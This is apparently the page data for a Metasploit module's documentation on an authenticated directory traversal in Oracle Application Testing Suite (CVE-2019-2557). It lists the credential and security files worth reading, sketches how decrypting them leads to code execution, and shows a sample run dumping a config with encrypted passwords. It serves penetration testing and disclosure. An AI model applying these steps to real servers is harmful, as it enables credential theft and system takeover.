{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/gather/oats_downloadservlet_traversal","result":{"data":{"moduleMetadataJson":{"id":"12bf50e8-4e07-5af6-a778-ce38e696de9f","name":"Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal","fullname":"auxiliary/gather/oats_downloadservlet_traversal","description":"This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load\n        Testing interface, a remote user can abuse the custom report template selector, and cause the\n        DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application\n        contains multiple configuration files that include encrypted credentials, and that there are\n        public resources for decryption, it is actually possible to gain remote code execution\n        by leveraging this directory traversal attack.\n\n        Please note that authentication is required. By default, OATS has two built-in accounts:\n        default and administrator. You could try to target those first.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/gather/oats_downloadservlet_traversal","documentationSlug":"/modules/documentation/auxiliary/gather/oats_downloadservlet_traversal","referencesSlug":"/modules/references/auxiliary/gather/oats_downloadservlet_traversal"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>Oracle Application Testing Suite (OATS) is a comprehensive, integrated testing solution for web applications, web services, packaged Oracle applications, and Oracle databases. OATS is part of an application deployed in the WebLogic service on port 8088, which also includes these tools: Administrator, OpenScript, Oracle Load Testing, and Oracle Test Manager.</p>\n<p>In the Load Testing component, a vulnerability was discovered by Steven Seeley (@mr_me) of Source Incite in the DownloadServlet class. According to the Source Incite advisory, the issue results from the lack of proper validation of a user-supplied string before using it to read a file. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Note that authentication is required.</p>\n<p>This vulnerability is also known as CVE-2019-2557.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The following is the exact setup I used to test and analyze the vulnerability:</p>\n<ul>\n<li>\n<p>Windows Server 2008 R2 x64 (other Windows systems are also supported)</p>\n<ul>\n<li>.Net Framework 3.5 enabled (from add/remove features)</li>\n<li>IE ESC (from Server Manager) disabled</li>\n<li>8GB of RAM (at least more than 4GB will be used to run OATS)</li>\n<li>Duel-Core processor</li>\n</ul>\n</li>\n<li>oats-win64-full-13.3.0.1.262.zip (x86 did not work for me)</li>\n<li>Jdk-7u21-windows-x64.exe</li>\n<li>OracleXE112_Win64.zip (Newer version 18c did not work well for me)</li>\n<li>Firefox (I had to install this because IE on Win2k8 is completely outdated)</li>\n<li>Adobe Flash installed (IE ESC needs to be disabled in order to install this)</li>\n</ul>\n<p>For installation instructions, please refer to the Oracle Application Testing Suite Installation Guide.</p>\n<h2 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h2>\n<p>By default, your starting traversal path is:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">C:\\OracleATS\\config\\Report Templates\\</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>There are some interesting files you can steal from this directory, such as:</p>\n<ul>\n<li>oats-config.xml</li>\n<li>oats-database-config.xml</li>\n<li>oats-keystore</li>\n</ul>\n<p>Code execution is possible leveraging from this vulnerability if you target these files:</p>\n<ul>\n<li>C:\\OracleATS\\oats\\servers\\AdminServer\\security\\SerializedSystemIni.dat</li>\n<li>C:\\OracleATS\\oats\\servers\\AdminServer\\security\\boot.properties</li>\n</ul>\n<p>After that, you can find a third party script to decrypt the credentials, and then you could\ngain code execution from the administrator console.</p>\n<h2 id=\"credit\" style=\"position:relative;\"><a href=\"#credit\" aria-label=\"credit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Credit</h2>\n<p>Special thanks to Steven Seeley to assist on the development of the Metasploit module.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 auxiliary(gather/oats_downloadservlet_traversal) &gt; run\n[*] Running module against 172.16.249.143\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;\n&lt;!DOCTYPE properties SYSTEM &quot;http://java.sun.com/dtd/properties.dtd&quot;&gt;\n&lt;properties&gt;\n&lt;entry key=&quot;oracle.oats.cluster.agent.username&quot;&gt;oats-agent&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.security.keystore.info&quot;&gt;eYAdfLaDkdBlUmflYhpg+CHGeXc=&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.cluster.username&quot;&gt;oats&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.cluster.agent.password&quot;&gt;{AES}WNdIPXpoeoZzyDNuJPm0wU4R3YKc1SUR2k5+TbQfzIQ=&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.admin.username&quot;&gt;oats&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.http.url&quot;&gt;http://localhost:8088&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.config.version&quot;&gt;9.1.0&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.admin.password&quot;&gt;{AES}NHrwlbPc7Arlb7puj+UlzAAXB/dUEbv3bdwNnee1/sc=&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.cluster.password&quot;&gt;{AES}WMTjMmLChdB9CTSrnyJ33113u0ml0juuGZQCWPODJTk=&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.admin.url&quot;&gt;t3://localhost:8088&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.tmp.dir&quot;&gt;/tmp&lt;/entry&gt;\n&lt;entry key=&quot;oracle.oats.cluster.url&quot;&gt;t3://localhost:8088&lt;/entry&gt;\n&lt;/properties&gt;\n\n[*] Auxiliary module execution completed\nmsf5 auxiliary(gather/oats_downloadservlet_traversal) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"12bf50e8-4e07-5af6-a778-ce38e696de9f"}}}